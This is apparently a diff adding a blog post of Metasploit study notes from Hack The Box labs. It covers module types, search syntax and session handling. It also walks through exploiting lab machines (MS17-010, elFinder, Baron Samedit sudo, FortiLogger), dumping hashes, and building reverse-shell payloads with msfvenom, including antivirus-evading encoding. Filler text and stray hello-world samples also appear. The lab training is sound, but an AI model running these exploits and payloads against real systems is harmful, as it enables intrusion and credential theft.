@@ -1,0 +1,218 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/blogs/icon.png"><meta name="generator" content="Astro v5.1.1"><!-- Fonts --><!-- Font styles --><!-- Preload font files --><link rel="preload" href="/blogs/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/blogs/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://laudantstolam.github.io/blogs/metasploit/"><!-- Primary Meta Tags --><title>Metasploit</title><meta name="title" content="Metasploit"><meta name="description"><meta name="keywords" content="資安, 紅隊"><!-- Robots Meta Tags --><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://laudantstolam.github.io/blogs/metasploit/"><meta property="og:title" content="Metasploit"><meta property="og:description"><meta property="og:image" content="https://raw.githubusercontent.com/Ash0645/image_remote/main/metasploit_cheatsheet.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://laudantstolam.github.io/blogs/metasploit/"><meta property="twitter:title" content="Metasploit"><meta property="twitter:description"><meta property="twitter:image" content="https://raw.githubusercontent.com/Ash0645/image_remote/main/metasploit_cheatsheet.png"><!-- KaTeX CSS for LaTeX rendering --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><link rel="stylesheet" href="/blogs/_astro/_slug_.c4-fh-8c.css">
+<link rel="stylesheet" href="/blogs/_astro/_slug_.DnqyYaEC.css">
+<link rel="stylesheet" href="/blogs/_astro/_slug_.BVeb309D.css">
+<style>[data-astro-image]{width:100%;height:auto;-o-object-fit:var(--fit);object-fit:var(--fit);-o-object-position:var(--pos);object-position:var(--pos);aspect-ratio:var(--w) / var(--h)}[data-astro-image=responsive]{max-width:calc(var(--w) * 1px);max-height:calc(var(--h) * 1px)}[data-astro-image=fixed]{width:calc(var(--w) * 1px);height:calc(var(--h) * 1px)}
+</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <div class="nav-wrapper" data-astro-cid-3ef6ksr2> <!-- <div class="nav-brand">
+				<a href={getUrl('/')} class="brand-link">
+					<div class="brand-icon">
+						<img src={getUrl('/icon.png')} alt="icon logo" width="24" height="24" />
+					</div>
+					<span class="brand-text">{SITE_TITLE}</span>
+				</a>
+			</div> --> <div class="nav-links" data-astro-cid-3ef6ksr2> <a href="/blogs/" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Home </a>  <a href="/blogs/blog" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Blog </a>  <a href="/blogs/projects" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> About </a>  </div> <div class="nav-actions" data-astro-cid-3ef6ksr2> <button id="theme-toggle" class="theme-toggle" title="Toggle theme" aria-label="Toggle theme" data-astro-cid-x3pjskd3> <svg width="20" height="20" viewBox="0 0 24 24" class="sun-icon" data-astro-cid-x3pjskd3> <path fill="currentColor" d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" data-astro-cid-x3pjskd3></path> </svg> <svg width="20" height="20" viewBox="0 0 24 24" class="moon-icon" data-astro-cid-x3pjskd3> <path fill="currentColor" d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.94174 4 12Z" data-astro-cid-x3pjskd3></path> </svg> </button>  <script type="module">const m=document.getElementById("theme-toggle");function t(e){document.documentElement.setAttribute("data-theme",e),localStorage.setItem("theme",e)}function o(){const n=(document.documentElement.getAttribute("data-theme")||"dark")==="light"?"dark":"light";t(n)}function d(){const e=localStorage.getItem("theme");t(e||"dark")}m?.addEventListener("click",o);document.addEventListener("DOMContentLoaded",d);window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{localStorage.getItem("theme")||t("dark")});</script> <a href="https://github.com/laudantstolam" target="_blank" class="social-link" aria-label="GitHub" data-astro-cid-3ef6ksr2> <svg viewBox="0 0 16 16" aria-hidden="true" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </div> </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo> <div class="prose" data-astro-cid-bvzihdzo> <div class="title" data-astro-cid-bvzihdzo>  <h1 data-astro-cid-bvzihdzo>Metasploit</h1> <div class="subtitle" data-astro-cid-bvzihdzo>some notes to metasploit from HTB</div> <div class="tags" data-astro-cid-bvzihdzo> <a href="/blogs/tag/資安/" class="tag" data-astro-cid-bvzihdzo>#資安</a><a href="/blogs/tag/紅隊/" class="tag" data-astro-cid-bvzihdzo>#紅隊</a> </div> <div class="hero-image" data-astro-cid-bvzihdzo> <img width="1020" height="510" src="https://raw.githubusercontent.com/Ash0645/image_remote/main/metasploit_cheatsheet.png" alt data-astro-cid-bvzihdzo> </div> </div>  <p><code>msfconsole</code> 啟動!</p>
+<p><a href="https://blog.csdn.net/weixin_52134577/article/details/126361269">Hack The Box - Using the Metasploit Framework_using the metasploit framework hackthebox-CSDN博客</a></p>
+<blockquote>
+<p>process</p>
+</blockquote>
+<ul>
+<li>Enumeration  枚舉</li>
+<li>Preparation  準備</li>
+<li>Exploitation  注入</li>
+<li>Privilege Escalation  特權升級</li>
+<li>Post-Exploitation  資訊整理</li>
+</ul>
+<blockquote>
+<p>Syntax</p>
+</blockquote>
+<div class="expressive-code"><link rel="stylesheet" href="/blogs/_astro/ec.0niu6.css"><script type="module" src="/blogs/_astro/ec.8zarh.js"></script><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">&#x3C;No.> &#x3C;type>/&#x3C;os>/&#x3C;service>/&#x3C;name></span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="<No.> <type>/<os>/<service>/<name>"><div></div></button></div></figure></div>
+<blockquote>
+<p>type</p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Type  類型</strong></th><th><strong>Description  描述</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  <br>掃描，模糊，嗅探和管理功能。提供額外的幫助和功能。</td></tr><tr><td><code>Encoders</code></td><td>Ensure that payloads are intact to their destination.  <br>確保有效載荷完整到目的地。</td></tr><tr><td><code>Exploits</code></td><td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.  <br>定義為利用漏洞的模塊，該漏洞將允許有效載荷交付。</td></tr><tr><td><code>NOPs</code></td><td>(No Operation code) Keep the payload sizes consistent across exploit attempts.  <br>（沒有操作代碼）保持有效載荷大小在漏洞嘗試中保持一致。</td></tr><tr><td><code>Payloads</code></td><td>Code runs remotely and calls back to the attacker machine to establish a connection (or shell).  <br>代碼遠程運行，並回電回攻擊機以建立連接（或外殼）。</td></tr><tr><td><code>Plugins</code></td><td>Additional scripts can be integrated within an assessment with <code>msfconsole</code> and coexist.  <br>可以將其他腳本與<code>msfconsole</code>和共有評估集成在一起。</td></tr><tr><td><code>Post</code></td><td>Wide array of modules to gather information, pivot deeper, etc.  <br>各種各樣的模塊，以收集信息，更深入的樞紐等。</td></tr></tbody></table>
+<blockquote>
+<p>search</p>
+</blockquote>
+<p>可以加上關鍵篩選</p>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="shell-session"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">search type:exploit platform:windows cve:2021 rank:excellent microsoft</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="search type:exploit platform:windows cve:2021 rank:excellent microsoft"><div></div></button></div></figure></div>
+<details data-callout="" data-callout-type="test" open>
+<summary data-callout-title="">LAB01</summary>
+<div data-callout-body="">
+<p><code>nmap -sV 10.129.195.148</code>
+<code>use exploit(windows/smb/ms17_010_psexec) > </code>
+<code>set RHOSTS 10.129.195.148</code>
+<code>run</code>
+<code>shell</code>
+<code>cd Administrator/Desktop/</code>
+<code>type flag.txt</code>—>win裡面不能用cat
+this is l1
+this is l2</p>
+<p>this will fail</p>
+</div>
+</details>
+<details data-callout="" data-callout-type="bug" open>
+<summary data-callout-title="">th</summary>
+<div data-callout-body="">
+<p>rekkor</p>
+<p>ropgerko</p>
+<p>rjgoejp</p>
+<p>erogoopej</p>
+<p>regojerp</p>
+<p>erjjegj
+erpgpejo</p>
+</div>
+</details>
+<details data-callout="" data-callout-type="tip" open>
+<summary data-callout-title="">msfconsole小技巧</summary>
+<div data-callout-body="">
+<p></p>
+<ol>
+<li>grep 要在前面 ex<code>grep -c meterpreter show payloads</code></li>
+<li>可以多加幾個grep</li>
+<li>要用橋接MODE(VM)->設定VPN</li>
+<li>確認網段 <code>ip a | grep tun0</code></li>
+<li>確認payload <code>set PAYLOAD linux/x64/shell_reverse_tcp</code></li>
+</ol>
+</div>
+</details>
+<details data-callout="" data-callout-type="test" open>
+<summary data-callout-title="">LAB2 payload</summary>
+<div data-callout-body="">
+<p><code>grep druid search apache</code>
+<code>use exploit(linux/http/apache_druid_js_rce)</code>
+<code>set PAYLOAD linux/x64/shell_reverse_tcp</code>
+<code>run</code>
+<code>pwd</code>
+<code>cd ..</code>
+<code>cat flag.txt</code>
+<code>HTB{MSF_Expl01t4t10n}</code></p>
+</div>
+</details>
+<blockquote>
+<p>Encoder</p>
+</blockquote>
+<p>encode payload to escape
+diverse in x64/x86/sparc/pps/mips</p>
+<p>ex. create a plain payload</p>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">user@htb$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="user@htb$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &#x22;\x00&#x22; -f perl"><div></div></button></div></figure></div>
+<p>create an encoded payload</p>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">user@htb$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="user@htb$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &#x22;\x00&#x22; -f perl -e x86/shikata_ga_nai"><div></div></button></div></figure></div>
+<p>可以結合<code>mfs-virustotal</code> 來看加密後的會不會被偵測到(需要先申請VT API)</p>
+<blockquote>
+<p>Database</p>
+</blockquote>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">sudo systemctl start postgresql</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">sudo msfdb init</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">sudo msfdb status</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">sudo msfdb run</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">sudo systemctl status postgresql</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="sudo systemctl start postgresqlsudo msfdb initsudo msfdb statussudo msfdb runsudo systemctl status postgresql"><div></div></button></div></figure></div>
+<p>用<code>workspace</code>
+<code>-a</code> 添加工作區
+<code>-d</code> 刪除工作區</p>
+<p>還有個<code>db_nmap</code>指令 :O</p>
+<p><code>hosts</code>：顯示目前資料庫中儲存的所有主機資訊
+<code>services</code>：顯示目前資料庫中儲存的所有服務資訊
+<code>creds</code>：顯示目前資料庫中儲存的所有與目標互動的憑證資訊
+<code>loot</code>：顯示目前資料庫中儲存的所有使用者與服務的憑證，通常與 <code>creds</code> 命令搭配使用</p>
+<blockquote>
+<p>Plugins</p>
+</blockquote>
+<p>依然是插件王者
+<code>ls /usr/share/metasploit-framework/plugins</code></p>
+<p>其他資源: <a href="https://github.com/darkoperator/Metasploit-Plugins.git">https://github.com/darkoperator/Metasploit-Plugins.git</a></p>
+<p>啟動
+<code>load &#x3C;PLUG-IN></code></p>
+<blockquote>
+<p>Sessions</p>
+</blockquote>
+<p>他可能是想tmux跟git的聰明小功能都搞了</p>
+<p><code>Ctrl+Z</code> 把session丟到背景
+<code>sessions</code> 列出所有session
+<code>sessions -i &#x3C;No.></code> 跟特定sesssion互動</p>
+<blockquote>
+<p>jobs</p>
+</blockquote>
+<p><code>jobs -l</code>
+<code>jobs -K</code> kill all
+<code>kill &#x3C;NO.></code></p>
+<details data-callout="" data-callout-type="note" open>
+<summary data-callout-title="">LAB3</summary>
+<div data-callout-body="">
+<p>先從html看到它是一個elfinder系統在/#elf_l1_Lw下面
+看了一下有一個elFinder RCE(CVE-2019-9194)
+nmap:</p>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="txt"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">PORT   STATE SERVICE VERSION</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set TARGETURI /#elf_l1_Lw</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">TARGETURI => /#elf_l1_Lw</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.14.18</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">LHOST => 10.10.14.18</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set RHOST 10.129.38.184</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelmsf6 exploit(linux/http/elfinder_archive_cmd_injection) > set TARGETURI /#elf_l1_LwTARGETURI => /#elf_l1_Lwmsf6 exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.14.18LHOST => 10.10.14.18msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set RHOST 10.129.38.184"><div></div></button></div></figure></div>
+<p>這樣是進去了 但是顯示是<code>www-data</code> 需要提權到root
+然後我是小丑 其實這是sudo CVE</p>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">sudo -V</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Sudo version 1.8.31</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Sudoers policy plugin version 1.8.31</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Sudoers file grammar version 46</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Sudoers I/O plugin version 1.8.31</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="sudo -VSudo version 1.8.31Sudoers policy plugin version 1.8.31Sudoers file grammar version 46Sudoers I/O plugin version 1.8.31"><div></div></button></div></figure></div>
+<p>然後用session(<code>Ctrl+Z</code>)送到背景之後用<code>exploit(linux/local/sudo_baron_samedit)</code> 來執行POC
+最後會看到session這邊</p>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Id  Name  Type                   Information               Connection</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">--  ----  ----                   -----------               ----------</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">1         meterpreter x86/linux  www-data @ 10.129.38.184  10.10.14.18:4444 -> 10.129.38.184:36310 (10.129.38.184)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">2         meterpreter x64/linux  root @ 10.129.38.184      10.10.14.18:4444 -> 10.129.38.184:36646 (10.129.38.184)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="Id  Name  Type                   Information               Connection--  ----  ----                   -----------               ----------1         meterpreter x86/linux  www-data @ 10.129.38.184  10.10.14.18:4444 -> 10.129.38.184:36310 (10.129.38.184)2         meterpreter x64/linux  root @ 10.129.38.184      10.10.14.18:4444 -> 10.129.38.184:36646 (10.129.38.184)"><div></div></button></div></figure></div>
+</div>
+</details>
+<blockquote>
+<p>Meterpreter</p>
+</blockquote>
+<details data-callout="" data-callout-type="note" open>
+<summary data-callout-title="">LAB04</summary>
+<div data-callout-body="">
+<p></p>
+<ol>
+<li>nmap</li>
+</ol>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">$ sudo nmap -sV 10.129.203.65</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Not shown: 995 closed tcp ports (reset)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">PORT     STATE SERVICE       VERSION</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">135/tcp  open  msrpc         Microsoft Windows RPC</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">445/tcp  open  microsoft-ds?</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ sudo nmap -sV 10.129.203.65Not shown: 995 closed tcp ports (reset)PORT     STATE SERVICE       VERSION135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds?3389/tcp open  ms-wbt-server Microsoft Terminal Services5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows"><div></div></button></div></figure></div>
+<ol start="2">
+<li>seek 5000 -> FortiLogger login page</li>
+<li>search metaspolit</li>
+</ol>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">msf6 > search fortilogger</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">Matching Modules</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">================</span></div></div><div class="ec-line"><div class="code"><span style="--0:#e1e4e8;--1:#24292e">0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    >FortiLogger Arbitrary File Upload Exploit</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="msf6 > search fortiloggerMatching Modules================0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    >FortiLogger Arbitrary File Upload Exploit"><div></div></button></div></figure></div>
+<p><code>$ use 0</code>
+4. set Lhost/Rhost and run -> use shell
+5. get username -> <code>whoami=nt authority\system</code>
+6. get <code>htb-student</code> user hash -> <code>back to meterpreter</code> -> <code>hashdump</code> -> get it</p>
+</div>
+</details>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c"><code><div class="ec-line"><div class="code"><span style="--0:#F97583;--1:#BF3441">#include</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">&#x3C;stdio.h></span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#F97583;--1:#BF3441">int</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">main</span><span style="--0:#E1E4E8;--1:#24292E">() {</span></div></div><div class="ec-line"><div class="code"><span class="indent">   </span><span style="--0:#B392F0;--1:#6F42C1">printf</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"Hello, world!</span><span style="--0:#79B8FF;--1:#005CC5">\n</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">   </span><span style="--0:#F97583;--1:#BF3441">return</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#include <stdio.h>int main() {   printf(&#x22;Hello, world!\n&#x22;);   return 0;}"><div></div></button></div></figure></div>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="html"><code><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">&#x3C;!</span><span style="--0:#85E89D;--1:#1E7734">DOCTYPE</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">html</span><span style="--0:#E1E4E8;--1:#24292E">></span></div></div><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">&#x3C;</span><span style="--0:#85E89D;--1:#1E7734">html</span><span style="--0:#E1E4E8;--1:#24292E">></span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">&#x3C;</span><span style="--0:#85E89D;--1:#1E7734">body</span><span style="--0:#E1E4E8;--1:#24292E">></span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">&#x3C;</span><span style="--0:#85E89D;--1:#1E7734">h1</span><span style="--0:#E1E4E8;--1:#24292E">>Hello, world!&#x3C;/</span><span style="--0:#85E89D;--1:#1E7734">h1</span><span style="--0:#E1E4E8;--1:#24292E">></span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">&#x3C;/</span><span style="--0:#85E89D;--1:#1E7734">body</span><span style="--0:#E1E4E8;--1:#24292E">></span></div></div><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">&#x3C;/</span><span style="--0:#85E89D;--1:#1E7734">html</span><span style="--0:#E1E4E8;--1:#24292E">></span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="<!DOCTYPE html><html>  <body>    <h1>Hello, world!</h1>  </body></html>"><div></div></button></div></figure></div>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python"><code><div class="ec-line"><div class="code"><span style="--0:#F97583;--1:#BF3441">def</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">greet</span><span style="--0:#E1E4E8;--1:#24292E">(name):</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">f</span><span style="--0:#9ECBFF;--1:#032F62">"Hello, </span><span style="--0:#79B8FF;--1:#005CC5">{</span><span style="--0:#E1E4E8;--1:#24292E">name</span><span style="--0:#79B8FF;--1:#005CC5">}</span><span style="--0:#9ECBFF;--1:#032F62">!"</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">greet(</span><span style="--0:#9ECBFF;--1:#032F62">"World"</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="def greet(name):    print(f&#x22;Hello, {name}!&#x22;)greet(&#x22;World&#x22;)"><div></div></button></div></figure></div>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="asm"><code><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">.</span><span style="--0:#B392F0;--1:#6F42C1">section .data</span></div></div><div class="ec-line"><div class="code"><span style="--0:#B392F0;--1:#6F42C1">msg:</span><span style="--0:#E1E4E8;--1:#24292E"> .asciz "Hello, world!\n"</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">.</span><span style="--0:#B392F0;--1:#6F42C1">section .text</span></div></div><div class="ec-line"><div class="code"><span style="--0:#B392F0;--1:#6F42C1">.global</span><span style="--0:#E1E4E8;--1:#24292E"> _start</span></div></div><div class="ec-line"><div class="code"><span style="--0:#B392F0;--1:#6F42C1">_start:</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">mov</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">$1</span><span style="--0:#E1E4E8;--1:#24292E">, %</span><span style="--0:#79B8FF;--1:#005CC5">rax</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">mov</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">$1</span><span 